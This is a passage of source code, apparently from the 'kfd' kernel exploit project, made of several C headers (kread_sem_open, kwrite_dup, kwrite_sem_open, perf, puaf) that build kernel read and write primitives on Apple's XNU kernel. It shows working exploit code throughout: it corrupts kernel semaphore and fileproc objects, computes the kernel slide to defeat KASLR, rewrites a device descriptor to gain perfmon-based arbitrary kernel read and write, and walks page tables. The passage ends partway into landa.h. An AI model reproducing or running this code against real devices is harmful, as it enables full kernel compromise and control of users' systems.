    i32 fd = (i32)(usize)(sem_open(kread_sem_open_name, 0, 0, 0));
    assert(fd > 0);

    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    fds[id] = fd;
}

bool kread_sem_open_search(struct kfd* kfd, u64 object_uaddr)
{
    volatile struct psemnode* pnode = (volatile struct psemnode*)(object_uaddr);
    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    struct psem_fdinfo* sem_data = (struct psem_fdinfo*)(&fds[kfd->kread.krkw_maximum_id + 1]);

    if ((pnode[0].pinfo > PAC_MASK) &&
        (pnode[1].pinfo == pnode[0].pinfo) &&
        (pnode[2].pinfo == pnode[0].pinfo) &&
        (pnode[3].pinfo == pnode[0].pinfo) &&
        (pnode[0].padding == 0) &&
        (pnode[1].padding == 0) &&
        (pnode[2].padding == 0) &&
        (pnode[3].padding == 0)) {
        for (u64 object_id = kfd->kread.krkw_searched_id; object_id < kfd->kread.krkw_allocated_id; object_id++) {
            struct psem_fdinfo data = {};
            i32 callnum = PROC_INFO_CALL_PIDFDINFO;
            i32 pid = kfd->info.env.pid;
            u32 flavor = PROC_PIDFDPSEMINFO;
            u64 arg = fds[object_id];
            u64 buffer = (u64)(&data);
            i32 buffersize = (i32)(sizeof(struct psem_fdinfo));

            const u64 shift_amount = 4;
            pnode[0].pinfo += shift_amount;
            assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);
            pnode[0].pinfo -= shift_amount;

            if (!memcmp(&data.pseminfo.psem_name[0], &sem_data->pseminfo.psem_name[shift_amount], 16)) {
                kfd->kread.krkw_object_id = object_id;
                return true;
            }
        }

        /*
         * False alarm: it wasn't one of our psemmode objects.
         */
        print_warning("failed to find modified psem_name sentinel");
    }

    return false;
}

void kread_sem_open_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
{
    kread_from_method(u64, kread_sem_open_kread_u64);
}

void kread_sem_open_find_proc(struct kfd* kfd)
{
    volatile struct psemnode* pnode = (volatile struct psemnode*)(kfd->kread.krkw_object_uaddr);
    u64 pseminfo_kaddr = pnode->pinfo;
    u64 semaphore_kaddr = static_kget(struct pseminfo, psem_semobject, pseminfo_kaddr);
    u64 task_kaddr = static_kget(struct semaphore, owner, semaphore_kaddr);
    u64 proc_kaddr = task_kaddr - dynamic_info(proc__object_size);
    kfd->info.kaddr.kernel_proc = proc_kaddr;

    /*
     * Go backwards from the kernel_proc, which is the last proc in the list.
     */
    while (true) {
        i32 pid = dynamic_kget(proc__p_pid, proc_kaddr);
        if (pid == kfd->info.env.pid) {
            kfd->info.kaddr.current_proc = proc_kaddr;
            break;
        }

        proc_kaddr = dynamic_kget(proc__p_list__le_prev, proc_kaddr);
    }
}

void kread_sem_open_deallocate(struct kfd* kfd, u64 id)
{
    /*
     * Let kwrite_sem_open_deallocate() take care of
     * deallocating all the shared file descriptors.
     */
    return;
}

void kread_sem_open_free(struct kfd* kfd)
{
    /*
     * Let's null out the kread reference to the shared data buffer
     * because kwrite_sem_open_free() needs it and will free it.
     */
    kfd->kread.krkw_method_data = NULL;
}

/*
 * 64-bit kread function.
 */

u64 kread_sem_open_kread_u64(struct kfd* kfd, u64 kaddr)
{
    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    i32 kread_fd = fds[kfd->kread.krkw_object_id];

    volatile struct psemnode* pnode = (volatile struct psemnode*)(kfd->kread.krkw_object_uaddr);
    u64 old_pinfo = pnode->pinfo;
    u64 new_pinfo = kaddr - offsetof(struct pseminfo, psem_uid);
    pnode->pinfo = new_pinfo;

    struct psem_fdinfo data = {};
    i32 callnum = PROC_INFO_CALL_PIDFDINFO;
    i32 pid = kfd->info.env.pid;
    u32 flavor = PROC_PIDFDPSEMINFO;
    u64 arg = kread_fd;
    u64 buffer = (u64)(&data);
    i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);

    pnode->pinfo = old_pinfo;
    return *(u64*)(&data.pseminfo.psem_stat.vst_uid);
}

/*
 * 32-bit kread function that is guaranteed to not underflow a page,
 * i.e. those 4 bytes are the first 4 bytes read by the modified kernel pointer.
 */

u32 kread_sem_open_kread_u32(struct kfd* kfd, u64 kaddr)
{
    i32* fds = (i32*)(kfd->kread.krkw_method_data);
    i32 kread_fd = fds[kfd->kread.krkw_object_id];

    volatile struct psemnode* pnode = (volatile struct psemnode*)(kfd->kread.krkw_object_uaddr);
    u64 old_pinfo = pnode->pinfo;
    u64 new_pinfo = kaddr - offsetof(struct pseminfo, psem_usecount);
    pnode->pinfo = new_pinfo;

    struct psem_fdinfo data = {};
    i32 callnum = PROC_INFO_CALL_PIDFDINFO;
    i32 pid = kfd->info.env.pid;
    u32 flavor = PROC_PIDFDPSEMINFO;
    u64 arg = kread_fd;
    u64 buffer = (u64)(&data);
    i32 buffersize = (i32)(sizeof(struct psem_fdinfo));
    assert(syscall(SYS_proc_info, callnum, pid, flavor, arg, buffer, buffersize) == buffersize);

    pnode->pinfo = old_pinfo;
    return *(u32*)(&data.pseminfo.psem_stat.vst_size);
}

#endif /* kread_sem_open_h */

```

`kfd/libkfd/krkw/kwrite/kwrite_dup.h`:

```h
/*
 * Copyright (c) 2023 FÃ©lix Poulin-BÃ©langer. All rights reserved.
 */

#ifndef kwrite_dup_h
#define kwrite_dup_h

void kwrite_dup_kwrite_u64(struct kfd* kfd, u64 kaddr, u64 new_value);

void kwrite_dup_init(struct kfd* kfd)
{
    kfd->kwrite.krkw_maximum_id = kfd->info.env.maxfilesperproc - 100;
    kfd->kwrite.krkw_object_size = sizeof(struct fileproc);

    kfd->kwrite.krkw_method_data_size = ((kfd->kwrite.krkw_maximum_id + 1) * (sizeof(i32)));
    kfd->kwrite.krkw_method_data = malloc_bzero(kfd->kwrite.krkw_method_data_size);

    i32 kqueue_fd = kqueue();
    assert(kqueue_fd > 0);

    i32* fds = (i32*)(kfd->kwrite.krkw_method_data);
    fds[kfd->kwrite.krkw_maximum_id] = kqueue_fd;
}

void kwrite_dup_allocate(struct kfd* kfd, u64 id)
{
    i32* fds = (i32*)(kfd->kwrite.krkw_method_data);
    i32 kqueue_fd = fds[kfd->kwrite.krkw_maximum_id];
    i32 fd = dup(kqueue_fd);
    assert(fd > 0);
    fds[id] = fd;
}

bool kwrite_dup_search(struct kfd* kfd, u64 object_uaddr)
{
    volatile struct fileproc* fp = (volatile struct fileproc*)(object_uaddr);
    i32* fds = (i32*)(kfd->kwrite.krkw_method_data);

    if ((fp->fp_iocount == 1) &&
        (fp->fp_vflags == 0) &&
        (fp->fp_flags == 0) &&
        (fp->fp_guard_attrs == 0) &&
        (fp->fp_glob > PTR_MASK) &&
        (fp->fp_guard == 0)) {
        for (u64 object_id = kfd->kwrite.krkw_searched_id; object_id < kfd->kwrite.krkw_allocated_id; object_id++) {
            assert_bsd(fcntl(fds[object_id], F_SETFD, FD_CLOEXEC));

            if (fp->fp_flags == 1) {
                kfd->kwrite.krkw_object_id = object_id;
                return true;
            }

            assert_bsd(fcntl(fds[object_id], F_SETFD, 0));
        }

        /*
         * False alarm: it wasn't one of our fileproc objects.
         */
        print_warning("failed to find modified fp_flags sentinel");
    }

    return false;
}

void kwrite_dup_kwrite(struct kfd* kfd, void* uaddr, u64 kaddr, u64 size)
{
    kwrite_from_method(u64, kwrite_dup_kwrite_u64);
}

void kwrite_dup_find_proc(struct kfd* kfd)
{
    /*
     * Assume that kread is responsible for that.
     */
    return;
}

void kwrite_dup_deallocate(struct kfd* kfd, u64 id)
{
    i32* fds = (i32*)(kfd->kwrite.krkw_method_data);
    assert_bsd(close(fds[id]));
}

void kwrite_dup_free(struct kfd* kfd)
{
    kwrite_dup_deallocate(kfd, kfd->kwrite.krkw_object_id);
    kwrite_dup_deallocate(kfd, kfd->kwrite.krkw_maximum_id);
}

/*
 * 64-bit kwrite function.
 */

void kwrite_dup_kwrite_u64(struct kfd* kfd, u64 kaddr, u64 new_value)
{
    if (new_value == 0) {
        print_warning("cannot write 0");
        return;
    }

    i32* fds = (i32*)(kfd->kwrite.krkw_method_data);
    i32 kwrite_fd = fds[kfd->kwrite.krkw_object_id];
    u64 fileproc_uaddr = kfd->kwrite.krkw_object_uaddr;
    volatile struct fileproc* fp = (volatile struct fileproc*)(fileproc_uaddr);

    const bool allow_retry = false;

    do {
        u64 old_value = 0;
        kread((u64)(kfd), kaddr, &old_value, sizeof(old_value));

        if (old_value == 0) {
            print_warning("cannot overwrite 0");
            return;
        }

        if (old_value == new_value) {
            break;
        }

        u16 old_fp_guard_attrs = fp->fp_guard_attrs;
        u16 new_fp_guard_attrs = GUARD_REQUIRED;
        fp->fp_guard_attrs = new_fp_guard_attrs;

        u64 old_fp_guard = fp->fp_guard;
        u64 new_fp_guard = kaddr - offsetof(struct fileproc_guard, fpg_guard);
        fp->fp_guard = new_fp_guard;

        u64 guard = old_value;
        u32 guardflags = GUARD_REQUIRED;
        u64 nguard = new_value;
        u32 nguardflags = GUARD_REQUIRED;

        if (allow_retry) {
            syscall(SYS_change_fdguard_np, kwrite_fd, &guard, guardflags, &nguard, nguardflags, NULL);
        } else {
            assert_bsd(syscall(SYS_change_fdguard_np, kwrite_fd, &guard, guardflags, &nguard, nguardflags, NULL));
        }

        fp->fp_guard_attrs = old_fp_guard_attrs;
        fp->fp_guard = old_fp_guard;
    } while (allow_retry);
}

#endif /* kwrite_dup_h */

```

`kfd/libkfd/krkw/kwrite/kwrite_sem_open.h`:

```h
/*
 * Copyright (c) 2023 FÃ©lix Poulin-BÃ©langer. All rights reserved.
 */

#ifndef kwrite_sem_open_h
#define kwrite_sem_open_h

void kwrite_sem_open_init(struct kfd* kfd)
{
    kfd->kwrite.krkw_maximum_id = kfd->kread.krkw_maximum_id;
    kfd->kwrite.krkw_object_size = sizeof(struct fileproc);

    kfd->kwrite.krkw_method_data_size = kfd->kread.krkw_method_data_size;
    kfd->kwrite.krkw_method_data = kfd->kread.krkw_method_data;
}

void kwrite_sem_open_allocate(struct kfd* kfd, u64 id)
{
    if (id == 0) {
        id = kfd->kwrite.krkw_allocated_id = kfd->kread.krkw_allocated_id;
        if (kfd->kwrite.krkw_allocated_id == kfd->kwrite.krkw_maximum_id) {
            /*
             * Decrement krkw_allocated_id to account for increment in
             * krkw_helper_run_allocate(), because we return without allocating.
             */
            kfd->kwrite.krkw_allocated_id--;
            return;
        }
    }

    /*
     * Just piggyback.
     */
    kread_sem_open_allocate(kfd, id);
}

bool kwrite_sem_open_search(struct kfd* kfd, u64 object_uaddr)
{
    /*
     * Just piggyback.
     */
    return kwrite_dup_search(kfd, object_uaddr);
}

void kwrite_sem_open_kwrite(struct kfd* kfd, void* uaddr, u64 kaddr, u64 size)
{
    /*
     * Just piggyback.
     */
    kwrite_dup_kwrite(kfd, uaddr, kaddr, size);
}

void kwrite_sem_open_find_proc(struct kfd* kfd)
{
    /*
     * Assume that kread is responsible for that.
     */
    return;
}

void kwrite_sem_open_deallocate(struct kfd* kfd, u64 id)
{
    /*
     * Skip the deallocation for the kread object because we are
     * responsible for deallocating all the shared file descriptors.
     */
    if (id != kfd->kread.krkw_object_id) {
        i32* fds = (i32*)(kfd->kwrite.krkw_method_data);
        assert_bsd(close(fds[id]));
    }
}

void kwrite_sem_open_free(struct kfd* kfd)
{
    /*
     * Note that we are responsible to deallocate the kread object, but we must
     * discard its object id because of the check in kwrite_sem_open_deallocate().
     */
    u64 kread_id = kfd->kread.krkw_object_id;
    kfd->kread.krkw_object_id = (-1);
    kwrite_sem_open_deallocate(kfd, kread_id);
    kwrite_sem_open_deallocate(kfd, kfd->kwrite.krkw_object_id);
    kwrite_sem_open_deallocate(kfd, kfd->kwrite.krkw_maximum_id);
}

#endif /* kwrite_sem_open_h */

```

`kfd/libkfd/perf.h`:

```h
/*
 * Copyright (c) 2023 FÃ©lix Poulin-BÃ©langer. All rights reserved.
 */

#ifndef perf_h
#define perf_h

// Forward declarations for helper functions.
u64 phystokv(struct kfd* kfd, u64 pa);
u64 vtophys(struct kfd* kfd, u64 va);

void perf_kread(struct kfd* kfd, u64 kaddr, void* uaddr, u64 size)
{
    assert((size != 0) && (size <= UINT16_MAX));
    assert(kfd->perf.shared_page.uaddr);
    assert(kfd->perf.shared_page.kaddr);

    volatile struct perfmon_config* config = (volatile struct perfmon_config*)(kfd->perf.shared_page.uaddr);
    *config = (volatile struct perfmon_config){};
    config->pc_spec.ps_events = (struct perfmon_event*)(kaddr);
    config->pc_spec.ps_event_count = (u16)(size);

    struct perfmon_spec spec_buffer = {};
    spec_buffer.ps_events = (struct perfmon_event*)(uaddr);
    spec_buffer.ps_event_count = (u16)(size);
    assert_bsd(ioctl(kfd->perf.dev.fd, PERFMON_CTL_SPECIFY, &spec_buffer));

    *config = (volatile struct perfmon_config){};
}

void perf_kwrite(struct kfd* kfd, void* uaddr, u64 kaddr, u64 size)
{
    assert((size != 0) && ((size % sizeof(u64)) == 0));
    assert(kfd->perf.shared_page.uaddr);
    assert(kfd->perf.shared_page.kaddr);

    volatile struct perfmon_config* config = (volatile struct perfmon_config*)(kfd->perf.shared_page.uaddr);
    volatile struct perfmon_source* source = (volatile struct perfmon_source*)(kfd->perf.shared_page.uaddr + sizeof(*config));
    volatile struct perfmon_event* event = (volatile struct perfmon_event*)(kfd->perf.shared_page.uaddr + sizeof(*config) + sizeof(*source));

    u64 source_kaddr = kfd->perf.shared_page.kaddr + sizeof(*config);
    u64 event_kaddr = kfd->perf.shared_page.kaddr + sizeof(*config) + sizeof(*source);

    for (u64 i = 0; i < (size / sizeof(u64)); i++) {
        *config = (volatile struct perfmon_config){};
        *source = (volatile struct perfmon_source){};
        *event = (volatile struct perfmon_event){};

        config->pc_source = (struct perfmon_source*)(source_kaddr);
        config->pc_spec.ps_events = (struct perfmon_event*)(event_kaddr);
        config->pc_counters = (struct perfmon_counter*)(kaddr + (i * sizeof(u64)));

        source->ps_layout.pl_counter_count = 1;
        source->ps_layout.pl_fixed_offset = 1;

        struct perfmon_event event_buffer = {};
        u64 kvalue = ((volatile u64*)(uaddr))[i];
        event_buffer.pe_number = kvalue;
        assert_bsd(ioctl(kfd->perf.dev.fd, PERFMON_CTL_ADD_EVENT, &event_buffer));
    }

    *config = (volatile struct perfmon_config){};
    *source = (volatile struct perfmon_source){};
    *event = (volatile struct perfmon_event){};
}

void perf_init(struct kfd* kfd)
{
    if (!kern_versions[kfd->info.env.vid].perf_supported) {
        return;
    }

    /*
     * Allocate a page that will be used as a shared buffer between user space and kernel space.
     */
    vm_address_t shared_page_address = 0;
    vm_size_t shared_page_size = pages(1);
    assert_mach(vm_allocate(mach_task_self(), &shared_page_address, shared_page_size, VM_FLAGS_ANYWHERE));
    memset((void*)(shared_page_address), 0, shared_page_size);
    kfd->perf.shared_page.uaddr = shared_page_address;
    kfd->perf.shared_page.size = shared_page_size;

    /*
     * Open a "/dev/aes_0" descriptor, then use it to find the kernel slide.
     */
    kfd->perf.dev.fd = open("/dev/aes_0", O_RDWR);
    assert(kfd->perf.dev.fd > 0);
}

void perf_run(struct kfd* kfd)
{
    if (!kern_versions[kfd->info.env.vid].perf_supported) {
        return;
    }

    assert(kfd->info.kaddr.current_proc);
    u64 fd_ofiles = dynamic_kget(proc__p_fd__fd_ofiles, kfd->info.kaddr.current_proc);
    u64 fileproc_kaddr = UNSIGN_PTR(fd_ofiles) + (kfd->perf.dev.fd * sizeof(u64));
    u64 fileproc = 0;
    kread((u64)(kfd), fileproc_kaddr, &fileproc, sizeof(fileproc));
    u64 fp_glob_kaddr = fileproc + offsetof(struct fileproc, fp_glob);
    u64 fp_glob = 0;
    kread((u64)(kfd), fp_glob_kaddr, &fp_glob, sizeof(fp_glob));
    u64 fg_ops = static_kget(struct fileglob, fg_ops, UNSIGN_PTR(fp_glob));
    u64 fo_kqfilter =  static_kget(struct fileops, fo_kqfilter, UNSIGN_PTR(fg_ops));
    u64 vn_kqfilter = UNSIGN_PTR(fo_kqfilter);
    u64 kernel_slide = vn_kqfilter - dynamic_info(kernelcache__vn_kqfilter);
    u64 kernel_base = ARM64_LINK_ADDR + kernel_slide;
    kfd->perf.kernel_slide = kernel_slide;
    print_x64(kfd->perf.kernel_slide);

    if (kfd->kread.krkw_method_ops.kread == kread_sem_open_kread) {
        u32 mh_header[2] = {};
        mh_header[0] = kread_sem_open_kread_u32(kfd, kernel_base);
        mh_header[1] = kread_sem_open_kread_u32(kfd, kernel_base + 4);
        assert(mh_header[0] == 0xfeedfacf);
        assert(mh_header[1] == 0x0100000c);
    }

    /*
     * Corrupt the "/dev/aes_0" descriptor into a "/dev/perfmon_core" descriptor.
     */
    u64 fg_data = static_kget(struct fileglob, fg_data, UNSIGN_PTR(fp_glob));
    u64 v_specinfo = static_kget(struct vnode, v_un.vu_specinfo, UNSIGN_PTR(fg_data));
    kfd->perf.dev.si_rdev_kaddr = UNSIGN_PTR(v_specinfo) + offsetof(struct specinfo, si_rdev);
    kread((u64)(kfd), kfd->perf.dev.si_rdev_kaddr, &kfd->perf.dev.si_rdev_buffer, sizeof(kfd->perf.dev.si_rdev_buffer));

    u64 cdevsw_kaddr = dynamic_info(kernelcache__cdevsw) + kernel_slide;
    u64 perfmon_dev_open_kaddr = dynamic_info(kernelcache__perfmon_dev_open) + kernel_slide;
    u64 cdevsw[14] = {};
    u32 dev_new_major = 0;
    for (u64 dmaj = 0; dmaj < 64; dmaj++) {
        u64 kaddr = cdevsw_kaddr + (dmaj * sizeof(cdevsw));
        kread((u64)(kfd), kaddr, &cdevsw, sizeof(cdevsw));
        u64 d_open = UNSIGN_PTR(cdevsw[0]);
        if (d_open == perfmon_dev_open_kaddr) {
            dev_new_major = (dmaj << 24);
            break;
        }
    }

    u32 new_si_rdev_buffer[2] = {};
    new_si_rdev_buffer[0] = dev_new_major;
    new_si_rdev_buffer[1] = kfd->perf.dev.si_rdev_buffer[1] + 1;
    kwrite((u64)(kfd), &new_si_rdev_buffer, kfd->perf.dev.si_rdev_kaddr, sizeof(new_si_rdev_buffer));

    /*
     * Find ptov_table, gVirtBase, gPhysBase, gPhysSize, TTBR0 and TTBR1.
     */
    u64 ptov_table_kaddr = dynamic_info(kernelcache__ptov_table) + kernel_slide;
    kread((u64)(kfd), ptov_table_kaddr, &kfd->perf.ptov_table, sizeof(kfd->perf.ptov_table));

    u64 gVirtBase_kaddr = dynamic_info(kernelcache__gVirtBase) + kernel_slide;
    kread((u64)(kfd), gVirtBase_kaddr, &kfd->perf.gVirtBase, sizeof(kfd->perf.gVirtBase));
    print_x64(kfd->perf.gVirtBase);

    u64 gPhysBase_kaddr = dynamic_info(kernelcache__gPhysBase) + kernel_slide;
    kread((u64)(kfd), gPhysBase_kaddr, &kfd->perf.gPhysBase, sizeof(kfd->perf.gPhysBase));
    print_x64(kfd->perf.gPhysBase);

    u64 gPhysSize_kaddr = dynamic_info(kernelcache__gPhysSize) + kernel_slide;
    kread((u64)(kfd), gPhysSize_kaddr, &kfd->perf.gPhysSize, sizeof(kfd->perf.gPhysSize));
    print_x64(kfd->perf.gPhysSize);

    assert(kfd->info.kaddr.current_pmap);
    kfd->perf.ttbr[0].va = static_kget(struct pmap, tte, kfd->info.kaddr.current_pmap);
    kfd->perf.ttbr[0].pa = static_kget(struct pmap, ttep, kfd->info.kaddr.current_pmap);
    assert(phystokv(kfd, kfd->perf.ttbr[0].pa) == kfd->perf.ttbr[0].va);

    assert(kfd->info.kaddr.kernel_pmap);
    kfd->perf.ttbr[1].va = static_kget(struct pmap, tte, kfd->info.kaddr.kernel_pmap);
    kfd->perf.ttbr[1].pa = static_kget(struct pmap, ttep, kfd->info.kaddr.kernel_pmap);
    assert(phystokv(kfd, kfd->perf.ttbr[1].pa) == kfd->perf.ttbr[1].va);

    /*
     * Find the shared page in kernel space.
     */
    kfd->perf.shared_page.paddr = vtophys(kfd, kfd->perf.shared_page.uaddr);
    kfd->perf.shared_page.kaddr = phystokv(kfd, kfd->perf.shared_page.paddr);

    /*
     * Set up the perfmon device use for the master kread and kwrite:
     * - perfmon_devices[0][0].pmdv_config = kfd->perf.shared_page.kaddr
     * - perfmon_devices[0][0].pmdv_allocated = true
     */
    struct perfmon_device perfmon_device = {};
    u64 perfmon_device_kaddr = dynamic_info(kernelcache__perfmon_devices) + kernel_slide;
    u8* perfmon_device_uaddr = (u8*)(&perfmon_device);
    kread((u64)(kfd), perfmon_device_kaddr, &perfmon_device, sizeof(perfmon_device));

    perfmon_device.pmdv_mutex[1] = (-1);
    perfmon_device.pmdv_config = (struct perfmon_config*)(kfd->perf.shared_page.kaddr);
    perfmon_device.pmdv_allocated = true;

    kwrite((u64)(kfd), perfmon_device_uaddr + 12, perfmon_device_kaddr + 12, sizeof(u64));
    ((volatile u32*)(perfmon_device_uaddr))[4] = 0;
    kwrite((u64)(kfd), perfmon_device_uaddr + 16, perfmon_device_kaddr + 16, sizeof(u64));
    ((volatile u32*)(perfmon_device_uaddr))[5] = 0;
    kwrite((u64)(kfd), perfmon_device_uaddr + 20, perfmon_device_kaddr + 20, sizeof(u64));
    kwrite((u64)(kfd), perfmon_device_uaddr + 24, perfmon_device_kaddr + 24, sizeof(u64));
    kwrite((u64)(kfd), perfmon_device_uaddr + 28, perfmon_device_kaddr + 28, sizeof(u64));

    kfd->perf.saved_kread = kfd->kread.krkw_method_ops.kread;
    kfd->perf.saved_kwrite = kfd->kwrite.krkw_method_ops.kwrite;
    kfd->kread.krkw_method_ops.kread = perf_kread;
    kfd->kwrite.krkw_method_ops.kwrite = perf_kwrite;
}

void perf_free(struct kfd* kfd)
{
    if (!kern_versions[kfd->info.env.vid].perf_supported) {
        return;
    }

    kfd->kread.krkw_method_ops.kread = kfd->perf.saved_kread;
    kfd->kwrite.krkw_method_ops.kwrite = kfd->perf.saved_kwrite;

    /*
     * Restore the "/dev/perfmon_core" descriptor back to the "/dev/aes_0" descriptor.
     * Then, close it and deallocate the shared page.
     * This leaves the first perfmon device "pmdv_allocated", which is fine.
     */
    kwrite((u64)(kfd), &kfd->perf.dev.si_rdev_buffer, kfd->perf.dev.si_rdev_kaddr, sizeof(kfd->perf.dev.si_rdev_buffer));
    assert_bsd(close(kfd->perf.dev.fd));
    assert_mach(vm_deallocate(mach_task_self(), kfd->perf.shared_page.uaddr, kfd->perf.shared_page.size));
}

/*
 * Helper perf functions.
 */

u64 phystokv(struct kfd* kfd, u64 pa)
{
    const u64 PTOV_TABLE_SIZE = 8;
    const u64 gVirtBase = kfd->perf.gVirtBase;
    const u64 gPhysBase = kfd->perf.gPhysBase;
    const u64 gPhysSize = kfd->perf.gPhysSize;
    const struct ptov_table_entry* ptov_table = &kfd->perf.ptov_table[0];

    for (u64 i = 0; (i < PTOV_TABLE_SIZE) && (ptov_table[i].len != 0); i++) {
        if ((pa >= ptov_table[i].pa) && (pa < (ptov_table[i].pa + ptov_table[i].len))) {
            return pa - ptov_table[i].pa + ptov_table[i].va;
        }
    }

    assert(!((pa < gPhysBase) || ((pa - gPhysBase) >= gPhysSize)));
    return pa - gPhysBase + gVirtBase;
}

u64 vtophys(struct kfd* kfd, u64 va)
{
    const u64 ROOT_LEVEL = PMAP_TT_L1_LEVEL;
    const u64 LEAF_LEVEL = PMAP_TT_L3_LEVEL;

    u64 pa = 0;
    u64 tt_kaddr = (va >> 63) ? kfd->perf.ttbr[1].va : kfd->perf.ttbr[0].va;

    for (u64 cur_level = ROOT_LEVEL; cur_level <= LEAF_LEVEL; cur_level++) {
        u64 offmask, shift, index_mask, valid_mask, type_mask, type_block;
        switch (cur_level) {
            case PMAP_TT_L0_LEVEL: {
                offmask = ARM_16K_TT_L0_OFFMASK;
                shift = ARM_16K_TT_L0_SHIFT;
                index_mask = ARM_16K_TT_L0_INDEX_MASK;
                valid_mask = ARM_TTE_VALID;
                type_mask = ARM_TTE_TYPE_MASK;
                type_block = ARM_TTE_TYPE_BLOCK;
                break;
            }
            case PMAP_TT_L1_LEVEL: {
                offmask = ARM_16K_TT_L1_OFFMASK;
                shift = ARM_16K_TT_L1_SHIFT;
                index_mask = ARM_16K_TT_L1_INDEX_MASK;
                valid_mask = ARM_TTE_VALID;
                type_mask = ARM_TTE_TYPE_MASK;
                type_block = ARM_TTE_TYPE_BLOCK;
                break;
            }
            case PMAP_TT_L2_LEVEL: {
                offmask = ARM_16K_TT_L2_OFFMASK;
                shift = ARM_16K_TT_L2_SHIFT;
                index_mask = ARM_16K_TT_L2_INDEX_MASK;
                valid_mask = ARM_TTE_VALID;
                type_mask = ARM_TTE_TYPE_MASK;
                type_block = ARM_TTE_TYPE_BLOCK;
                break;
            }
            case PMAP_TT_L3_LEVEL: {
                offmask = ARM_16K_TT_L3_OFFMASK;
                shift = ARM_16K_TT_L3_SHIFT;
                index_mask = ARM_16K_TT_L3_INDEX_MASK;
                valid_mask = ARM_PTE_TYPE_VALID;
                type_mask = ARM_PTE_TYPE_MASK;
                type_block = ARM_TTE_TYPE_L3BLOCK;
                break;
            }
            default: {
                assert_false("bad pmap tt level");
                return 0;
            }
        }

        u64 tte_index = (va & index_mask) >> shift;
        u64 tte_kaddr = tt_kaddr + (tte_index * sizeof(u64));
        u64 tte = 0;
        kread((u64)(kfd), tte_kaddr, &tte, sizeof(tte));

        if ((tte & valid_mask) != valid_mask) {
            return 0;
        }

        if ((tte & type_mask) == type_block) {
            pa = ((tte & ARM_TTE_PA_MASK & ~offmask) | (va & offmask));
            break;
        }

        tt_kaddr = phystokv(kfd, tte & ARM_TTE_TABLE_MASK);
    }

    return pa;
}

#endif /* perf_h */

```

`kfd/libkfd/puaf.h`:

```h
/*
 * Copyright (c) 2023 FÃ©lix Poulin-BÃ©langer. All rights reserved.
 */

#ifndef puaf_h
#define puaf_h

// Forward declarations for helper functions.
void puaf_helper_get_vm_map_first_and_last(u64* first_out, u64* last_out);
void puaf_helper_get_vm_map_min_and_max(u64* min_out, u64* max_out);
void puaf_helper_give_ppl_pages(void);

#include "puaf/landa.h"
#include "puaf/physpuppet.h"
#include "puaf/smith.h"

#define puaf_method_case(method)                                 \
    case puaf_##method: {                                        \
        const char* method_name = #method;                       \
        print_string(method_name);                               \
        kfd->puaf.puaf_method_ops.init = method##_init;          \
        kfd->puaf.puaf_method_ops.run = method##_run;            \
        kfd->puaf.puaf_method_ops.cleanup = method##_cleanup;    \
        kfd->puaf.puaf_method_ops.free = method##_free;          \
        break;                                                   \
    }

void puaf_init(struct kfd* kfd, u64 puaf_pages, u64 puaf_method)
{
    kfd->puaf.number_of_puaf_pages = puaf_pages;
    kfd->puaf.puaf_pages_uaddr = (u64*)(malloc_bzero(kfd->puaf.number_of_puaf_pages * sizeof(u64)));

    switch (puaf_method) {
        puaf_method_case(landa)
        puaf_method_case(physpuppet)
        puaf_method_case(smith)
    }

    kfd->puaf.puaf_method_ops.init(kfd);
}

void puaf_run(struct kfd* kfd)
{
    puaf_helper_give_ppl_pages();

    timer_start();
    kfd->puaf.puaf_method_ops.run(kfd);
    timer_end();
}

void puaf_cleanup(struct kfd* kfd)
{
    timer_start();
    kfd->puaf.puaf_method_ops.cleanup(kfd);
    timer_end();
}

void puaf_free(struct kfd* kfd)
{
    kfd->puaf.puaf_method_ops.free(kfd);

    bzero_free(kfd->puaf.puaf_pages_uaddr, kfd->puaf.number_of_puaf_pages * sizeof(u64));

    if (kfd->puaf.puaf_method_data) {
        bzero_free(kfd->puaf.puaf_method_data, kfd->puaf.puaf_method_data_size);
    }
}

/*
 * Helper puaf functions.
 */

void puaf_helper_get_vm_map_first_and_last(u64* first_out, u64* last_out)
{
    u64 first_address = 0;
    u64 last_address = 0;

    vm_address_t address = 0;
    vm_size_t size = 0;
    vm_region_basic_info_data_64_t data = {};
    vm_region_info_t info = (vm_region_info_t)(&data);
    mach_msg_type_number_t count = VM_REGION_BASIC_INFO_COUNT_64;
    mach_port_t port = MACH_PORT_NULL;

    while (true) {
        kern_return_t kret = vm_region_64(mach_task_self(), &address, &size, VM_REGION_BASIC_INFO_64, info, &count, &port);
        if (kret == KERN_INVALID_ADDRESS) {
            last_address = address;
            break;
        }

        assert(kret == KERN_SUCCESS);

        if (!first_address) {
            first_address = address;
        }

        address += size;
        size = 0;
    }

    *first_out = first_address;
    *last_out = last_address;
}

void puaf_helper_get_vm_map_min_and_max(u64* min_out, u64* max_out)
{
    task_vm_info_data_t data = {};
    task_info_t info = (task_info_t)(&data);
    mach_msg_type_number_t count = TASK_VM_INFO_COUNT;
    assert_mach(task_info(mach_task_self(), TASK_VM_INFO, info, &count));

    *min_out = data.min_address;
    *max_out = data.max_address;
}

void puaf_helper_give_ppl_pages(void)
{
    timer_start();

    const u64 given_ppl_pages_max = 10000;
    const u64 l2_block_size = (1ull << 25);

    vm_address_t addresses[given_ppl_pages_max] = {};
    vm_address_t address = 0;
    u64 given_ppl_pages = 0;

    u64 min_address, max_address;
    puaf_helper_get_vm_map_min_and_max(&min_address, &max_address);

    while (true) {
        address += l2_block_size;
        if (address < min_address) {
            continue;
        }

        if (address >= max_address) {
            break;
        }

        kern_return_t kret = vm_allocate(mach_task_self(), &address, pages(1), VM_FLAGS_FIXED);
        if (kret == KERN_SUCCESS) {
            memset((void*)(address), 'A', 1);
            addresses[given_ppl_pages] = address;
            if (++given_ppl_pages == given_ppl_pages_max) {
                break;
            }
        }
    }

    for (u64 i = 0; i < given_ppl_pages; i++) {
        assert_mach(vm_deallocate(mach_task_self(), addresses[i], pages(1)));
    }

    print_u64(given_ppl_pages);
    timer_end();
}

#endif /* puaf_h */

```

`kfd/libkfd/puaf/landa.h`:

```h
/*
 * Copyright (c) 2023 FÃ©lix Poulin-BÃ©langer. All rights reserved.
 */

#ifndef landa_h
#define landa_h

const u64 landa_vme1_size = pages(1);
